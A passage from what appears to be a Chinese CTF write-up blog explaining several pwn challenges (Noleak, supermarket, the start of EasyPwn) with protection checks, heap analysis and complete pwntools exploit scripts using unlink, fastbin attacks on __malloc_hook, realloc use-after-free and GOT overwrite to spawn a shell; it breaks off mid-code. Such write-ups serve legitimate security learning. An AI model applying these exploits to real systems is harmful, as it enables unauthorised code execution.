class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(add_idx, add_content)</span>:</span></span><br><span class="line">    success(<span class="string">'payload '</span> + str(add_idx) + <span class="string">' = '</span> + str(len(add_content)))</span><br><span class="line">    p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>, str(add_idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>, str(len(add_content) + <span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">'content:'</span>, str(add_content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">7</span>)</span><br><span class="line">add(<span class="number">1</span>, asm(<span class="string">'mov eax, 0x3b'</span>) + <span class="string">'\xEB\x19'</span>)</span><br><span class="line">add(<span class="number">2</span>, asm(<span class="string">'xor rsi, rsi'</span>) + <span class="string">'\x90\x90\xEB\x19'</span>)</span><br><span class="line">add(<span class="number">3</span>, asm(<span class="string">'xor rdx, rdx'</span>) + <span class="string">'\x90\x90\xEB\x19'</span>)</span><br><span class="line">add(<span class="number">4</span>, asm(<span class="string">'syscall'</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">idx = (got_atoi - addr_chunk_list) / <span class="number">8</span></span><br><span class="line">add(idx, <span class="string">'\x90'</span> * <span class="number">5</span>  + <span class="string">'\xEB\x19'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="Noleak"><a href="#Noleak" class="headerlink" title="Noleak"></a>Noleak</h2><h3 id="Description-11"><a href="#Description-11" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution:"></a>Solution:</h3><p>查看开了哪些保护机制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到关了 NX，说明我们可以用 shellcode，但是 got 表不可写，所以考虑用 malloc_hook 来提权</p>
<p>程序可以分配任意大小的堆块，先利用 unlink 改写存储堆地址的链表为 bss 地址和该链表的地址</p>
<p>然后在 bss 地址内写入 shellcode，利用堆链表的地址清空堆链表，保证后面可以用足够多的堆(因为题目默认只让用 10 个堆块)</p>
<p>布置好 shllcode 后就要想如何才能利用 malloc_hook 执行 shllcode</p>
<p>这里我们用 fastbin 来进行攻击：<strong>后释放出的 fastbin 的 fd 上会存有上一次释放的 fastbin 的 prev_size 地址</strong></p>
<p>根据这一特性，我们先申请两个符合 fastbin 的堆块(chunk 0, chunk 1)和一个符合 unsorted bin 的堆块(chunk 2)</p>
<p>然后分别释放它们(chunk 2 – chunk 1 – chunk 0)，之后 bin 布局如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x137d010</span> → <span class="number">0x137d080</span> ← <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="symbol">all:</span> <span class="number">0x137d0f0</span> → <span class="number">0x7f96b68edb78</span> (main_arena+<span class="number">88</span>) ← <span class="number">0x137d0f0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>然后利用 update 修改 chunk 0 的 fd 的末尾字符，使该值变为 unsorted bin 的地址(在我这就是输入一个字符<code>\xf0</code>)</p>
<p>再用 chunk 1 修改 chunk 2 的 size 值为 0x71 来绕过之后的 fastbin 检查</p>
<p>再用两个字符修改 chunk 2 上保存的 main_arena 的值为我们要构造 fastbin 的地址，之后的 bin 布局如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x91c010</span> → <span class="number">0x91c0f0</span> → <span class="number">0x7f734af0aaed</span> (dl_main+<span class="number">2317</span>) ← <span class="keyword">add</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> - <span class="number">0x7d</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line"><span class="symbol">FD:</span> <span class="number">0x91c0f0</span> → <span class="number">0x7f734af0aaed</span> (dl_main+<span class="number">2317</span>) ← <span class="keyword">add</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span> - <span class="number">0x7d</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">BK:</span> <span class="number">0x91c0f0</span> → <span class="number">0x7f734af02b78</span> (main_arena+<span class="number">88</span>) ← <span class="number">0x91c0f0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>这里<code>\xaa</code>的第一个<code>a</code>可以是任意值，因为 aslr 的原因，会有 16 种可能，所以最后要爆破，某次构造 fastbin 的地址值如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2gx <span class="number">0x7f734af02aed</span></span><br><span class="line"><span class="number">0x7f734af02aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0x734af01260000000</span>	<span class="number">0x000000000000007f</span></span><br></pre></td></tr></table></figure>

<p>之后再在 malloc_hook 的地址上写入 shellcode 的 bss 地址，再随便申请一个堆块即可完成提权</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">addr_chunk_list = <span class="number">0x601040</span></span><br><span class="line">addr_shellcode = <span class="number">0x601000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(create_size, create_data)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Size: '</span>, str(create_size))</span><br><span class="line">    p.sendafter(<span class="string">'Data: '</span>, create_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Index: '</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(update_idx, update_data)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Index: '</span>, str(update_idx))</span><br><span class="line">    p.sendafter(<span class="string">'Size: '</span>, str(len(update_data)))</span><br><span class="line">    p.sendafter(<span class="string">'Data: '</span>, update_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">()</span>:</span></span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    pd = p64(<span class="number">0</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">    pd += p64(addr_chunk_list - <span class="number">0x18</span>) + p64(addr_chunk_list - <span class="number">0x10</span>)</span><br><span class="line">    pd += <span class="string">'a'</span> * <span class="number">0xe0</span></span><br><span class="line">    pd += p64(<span class="number">0x100</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">    create(<span class="number">0x200</span>, pd)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    pd = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    pd += p64(addr_chunk_list) + p64(addr_shellcode)</span><br><span class="line">    update(<span class="number">0</span>, pd)</span><br><span class="line">    pd = asm(shellcraft.sh())</span><br><span class="line">    update(<span class="number">1</span>, pd)</span><br><span class="line">    update(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line">    create(<span class="number">0x60</span>, <span class="string">'A'</span> * <span class="number">8</span>)</span><br><span class="line">    create(<span class="number">0x60</span>, <span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line">    create(<span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">    create(<span class="number">0x60</span>, <span class="string">'C'</span> * <span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    update(<span class="number">2</span>, <span class="string">'\xed\xaa'</span>)</span><br><span class="line">    update(<span class="number">1</span>, <span class="string">'\x00'</span> * <span class="number">0x68</span> + <span class="string">'\x71\x00'</span>)</span><br><span class="line">    update(<span class="number">0</span>, <span class="string">'\xf0'</span>)</span><br><span class="line">    create(<span class="number">0x60</span>, <span class="string">'\x90'</span> * <span class="number">8</span>)</span><br><span class="line">    create(<span class="number">0x60</span>, <span class="string">'\x90'</span> * <span class="number">8</span>)</span><br><span class="line">    pd = <span class="string">'\x00'</span> * <span class="number">0x13</span></span><br><span class="line">    pd += p64(addr_shellcode)</span><br><span class="line">    create(<span class="number">0x60</span>, pd)</span><br><span class="line">    p.sendafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Size: '</span>, <span class="string">'96'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">            p = process(<span class="string">'./timu'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">37434</span>)</span><br><span class="line">        brute_force()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="supermarket"><a href="#supermarket" class="headerlink" title="supermarket"></a>supermarket</h2><h3 id="Description-12"><a href="#Description-12" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution:"></a>Solution:</h3><p>查看程序开启的保护</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>程序主要结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> price;</span><br><span class="line">    <span class="keyword">int</span> desc_size;</span><br><span class="line">    <span class="keyword">char</span> *desc_ptr;</span><br><span class="line">&#125;commodity;</span><br></pre></td></tr></table></figure>

<p><strong>1. add a commodity</strong></p>
<p>存完第一个数据以后是这样的，堆地址是随机化的</p>
<p>chunk_list = 0x09e3d008</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x804b080</span>:	<span class="number">0x09e3d008</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x9e3d000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000021</span>	<span class="number">0x00000030</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x9e3d010</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000001</span>	<span class="number">0x00000010</span></span><br><span class="line"><span class="number">0x9e3d020</span>:	<span class="number">0x09e3d028</span>	<span class="number">0x00000019</span>	<span class="number">0x61616161</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x9e3d030</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00020fc9</span></span><br></pre></td></tr></table></figure>

<p>可以推得主要变量表达形式</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> chunk_list[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">---- (&amp;chunk_list)[<span class="number">0</span>] == &amp;chunk_list == chunk_list == <span class="number">0x9e3d008</span></span><br><span class="line">---- *((&amp;chunk_list)[<span class="number">0</span>]) == chunk_list[<span class="number">0</span>] == *(<span class="number">0x9e3d008</span>) == <span class="number">0x30</span> == <span class="string">'0'</span>;           <span class="comment">// name</span></span><br><span class="line">---- *((&amp;chunk_list)[<span class="number">0</span>] + <span class="number">4</span>) == *(<span class="number">0x9e3d008</span> + <span class="number">4</span> * <span class="number">4</span>) == *(<span class="number">0x9e3d018</span>) == <span class="number">0x1</span> == <span class="number">1</span>    <span class="comment">// price;</span></span><br><span class="line">---- *((&amp;chunk_list)[<span class="number">0</span>] + <span class="number">5</span>) == *(<span class="number">0x9e3d008</span> + <span class="number">5</span> * <span class="number">4</span>) == *(<span class="number">0x9e3d01c</span>) == <span class="number">0x10</span> == <span class="number">16</span>  <span class="comment">// desc_size;</span></span><br><span class="line">---- *((&amp;chunk_list)[<span class="number">0</span>] + <span class="number">6</span>) == *(<span class="number">0x9e3d008</span> + <span class="number">6</span> * <span class="number">4</span>) == *(<span class="number">0x9e3d020</span>) == <span class="number">0x09e3d028</span>  <span class="comment">// *desc_ptr;</span></span><br></pre></td></tr></table></figure>

<p><strong>2. del a commodity</strong></p>
<p>找到对应下标 chunk_list[i]</p>
<p>将其中的 price 值置零，释放 *desc_ptr，再释放 (&amp;chunk_list)[0]，最后将 (&amp;chunk_list)[0] 置零</p>
<p><strong>5. Change the description of a commodity</strong></p>
<p>漏洞在 realloc，当重新分配的 new_size &gt; pre_size 释放原指针，重新分配内存；new_size &lt; pre_size，返回原指针</p>
<p>realloc 一个比之前 size 大的堆块时，释放原堆块，新建一个堆块，但是数组中的 *desc_ptr 指针并没有改成新分配的堆指针, 仍指向之前已经释放掉的堆块</p>
<p>这时申请一个总堆块，它的大小小于等于之前 realloc 释放掉的堆块大小，就可以将两个堆块都放到之前释放掉的堆块内</p>
<p>realloc 的地址没变，不管再做出什么改动，都会修改之前释放掉的堆块的地址，而且长度不限</p>
<p>那我们把 *desc_ptr 的位置改成 got_atoi 就可以靠 list 功能泄露出 atoi 的真实地址</p>
<p>之后靠 realloc 改写 atoi 的 got 表内容为 system 的地址，之后输入<code>/bin/sh</code>即可提权</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./supermarket'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">54608</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./supermarket'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_atoi = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(add_idx, add_size, add_desc)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>, str(add_idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'price:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'descrip_size:'</span>, str(add_size))</span><br><span class="line">    p.sendlineafter(<span class="string">'description:'</span>, add_desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(change_idx, change_size, change_desc)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>, str(change_idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'descrip_size:'</span>, str(change_size))</span><br><span class="line">    p.sendlineafter(<span class="string">'description:'</span>, change_desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x100</span>, <span class="string">''</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x80</span>, <span class="string">'c'</span> * <span class="number">8</span>)</span><br><span class="line">pd = p32(<span class="number">0x32</span>) + p32(<span class="number">0</span>)</span><br><span class="line">pd += <span class="string">'\x00'</span> * <span class="number">0x8</span></span><br><span class="line">pd += p32(<span class="number">0</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line">pd += p32(got_atoi) + p8(<span class="number">0x69</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x90</span>, pd)</span><br><span class="line">p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'2: price.0, des.'</span>)</span><br><span class="line">addr_atoi = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = addr_atoi - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">success(<span class="string">'addr_atoi   = '</span> + hex(addr_atoi))</span><br><span class="line">success(<span class="string">'addr_system = '</span> + hex(addr_system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">change(<span class="number">2</span>, <span class="number">0x50</span>, p32(addr_system))</span><br><span class="line">p.sendlineafter(<span class="string">'your choice&gt;&gt; '</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="EasyPwn"><a href="#EasyPwn" class="headerlink" title="EasyPwn"></a>EasyPwn</h2><h3 id="Description-13"><a href="#Description-13" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution:"></a>Solution:</h3><p>查看保护机制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>漏洞点在 sub_B30 函数中，具体漏洞如下，先看代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_B30</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-BF0h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+410h] [rbp-7F0h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+7F8h] [rbp-408h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+BF8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v3, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x7E8</span>uLL);</span><br><span class="line">  LOWORD(v3) = 's%';</span><br><span class="line">  BYTE2(v3) = <span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome To WHCTF2017:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x438</span>uLL);</span><br><span class="line">  <span 